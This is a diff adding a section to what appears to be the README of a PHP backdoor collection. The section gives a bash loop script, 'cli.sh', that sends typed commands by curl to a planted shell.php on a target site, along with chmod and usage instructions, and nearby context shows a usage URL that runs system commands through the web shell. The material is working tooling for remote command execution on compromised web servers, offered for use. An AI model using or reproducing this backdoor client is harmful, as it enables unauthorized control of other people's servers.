@@ -47,6 +47,25 @@ Usage :
     http://target.com/path/to/shell.php?_=system&__=ls
 ```
 
+<h2>Simple Bash Script For Handle Simple PHP Backdoor</h2>
+
+```
+while true;do read -p "[>] halah@wibu:~$ " cmd;curl $1$cmd;done
+```
+
+save into cli.sh and give access to execute with ```chmod +x cli.sh```
+
+Usage :
+```
+./cli.sh http://target.com/path/to/shell.php?0=
+```
+
+<center>
+  <img src="cli.PNG">
+  <img src="backdoor.PNG" width="50%" height="50%">
+  <img src="obfusecate.PNG" width="50%" height="50%">
+</center>
+
 <h1>File Uploader Backdoor</h1>
 
 ```
